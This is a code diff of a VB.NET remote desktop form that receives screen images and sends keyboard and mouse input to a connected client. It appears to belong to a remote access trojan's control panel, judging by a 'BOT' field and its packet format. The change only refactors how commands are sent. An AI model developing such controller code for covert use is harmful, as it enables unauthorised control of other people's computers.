@@ -3,9 +3,9 @@ Imports Microsoft.VisualBasic.CompilerServices
 
 Public Class Remote_Desktop
     Public M As Main
-    Public U As Integer
+    Public C As S_Client
     Public Sz As Size
-    Public C2 As Integer = 1
+    Public C2 As Integer = 3
     Public SPL = S_Settings.SPL
     Public BOT As String
 
@@ -28,12 +28,12 @@ Public Class Remote_Desktop
         MetroButton1_Click(MetroButton1, e)
     End Sub
 
-    Public Sub PktToImage(ByVal BY As Byte())
+    Public Async Sub PktToImage(ByVal BY As Byte())
         Try
             If MetroButton1.Text = "Stop" Then
-                M.S.Send(U, "@" & SPL & Combo_size.SelectedIndex & SPL & C2 & SPL & Combo_quality.SelectedItem)
+                C.BeginSend("@" & SPL & Combo_size.SelectedIndex & SPL & C2 & SPL & Combo_quality.SelectedItem)
             End If
-            Dim B As Array = fx(BY, "|'IMG'|")
+            Dim B As Array = Await fx(BY, "|'IMG'|")
             Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
             Dim L As Bitmap = Image.FromStream(Q)
             Dim QQ As String() = Split(BS(B(0)), ",")
@@ -48,6 +48,7 @@ Public Class Remote_Desktop
 
                 tp += SZ.Height
             Next
+
             G.Dispose()
             P1.Image = K
         Catch ex As Exception
@@ -91,10 +92,10 @@ Public Class Remote_Desktop
             If chkKey.Checked Then
                 Select Case e.KeyCode
                     Case Keys.Shift, Keys.ShiftKey, Keys.LShiftKey, Keys.RShiftKey
-                        M.S.Send(U, "%" + M.SPL + Conversions.ToString(0) + M.SPL + Conversions.ToString(&H10))
+                        C.BeginSend("%" + M.SPL + Conversions.ToString(0) + M.SPL + Conversions.ToString(&H10))
                         Return
                 End Select
-                M.S.Send(U, "%" + M.SPL + Conversions.ToString(0) + M.SPL + Conversions.ToString(CInt(e.KeyCode)))
+                C.BeginSend("%" + M.SPL + Conversions.ToString(0) + M.SPL + Conversions.ToString(CInt(e.KeyCode)))
             End If
         End If
     End Sub
@@ -105,10 +106,10 @@ Public Class Remote_Desktop
             If chkKey.Checked Then
                 Select Case e.KeyCode
                     Case Keys.Shift, Keys.ShiftKey, Keys.LShiftKey, Keys.RShiftKey
-                        M.S.Send(U, "%" + M.SPL + Conversions.ToString(2) + M.SPL + Conversions.ToString(&H10))
+                        C.BeginSend("%" + M.SPL + Conversions.ToString(2) + M.SPL + Conversions.ToString(&H10))
                         Return
                 End Select
-                M.S.Send(U, "%" + M.SPL + Conversions.ToString(2) + M.SPL + Conversions.ToString(CInt(e.KeyCode)))
+                C.BeginSend("%" + M.SPL + Conversions.ToString(2) + M.SPL + Conversions.ToString(CInt(e.KeyCode)))
             End If
         End If
     End Sub
@@ -123,7 +124,7 @@ Public Class Remote_Desktop
             If e.Button = Windows.Forms.MouseButtons.Right Then
                 but = 8
             End If
-            M.S.Send(U, "#" & M.SPL & PP.X & M.SPL & PP.Y & M.SPL & but)
+            C.BeginSend("#" & M.SPL & PP.X & M.SPL & PP.Y & M.SPL & but)
         End If
     End Sub
 
@@ -137,7 +138,7 @@ Public Class Remote_Desktop
             If e.Button = Windows.Forms.MouseButtons.Right Then
                 but = 16
             End If
-            M.S.Send(U, "#" & M.SPL & PP.X & M.SPL & PP.Y & M.SPL & but)
+            C.BeginSend("#" & M.SPL & PP.X & M.SPL & PP.Y & M.SPL & but)
         End If
 
     End Sub
@@ -159,7 +160,7 @@ Public Class Remote_Desktop
     Private Sub MetroButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MetroButton1.Click
         Try
             If MetroButton1.Text = "Start" Then
-                M.S.Send(U, "@" & SPL & Combo_size.SelectedIndex & SPL & C2 & SPL & Combo_quality.SelectedIndex)
+                C.BeginSend("@" & SPL & Combo_size.SelectedIndex & SPL & C2 & SPL & Combo_quality.SelectedIndex)
                 MetroButton1.Text = "Stop"
                 MetroButton1.Highlight = True
                 Combo_size.Enabled = False
@@ -183,11 +184,11 @@ Public Class Remote_Desktop
     End Sub
 
     Private Sub Cap_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
-        M.S.Send(U, "Close")
+        C.BeginSend("Close")
     End Sub
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
-        If Not M.S.Online.Contains(U) Then
+        If Not C.IsConnected Then
             Me.Close()
         End If
     End Sub
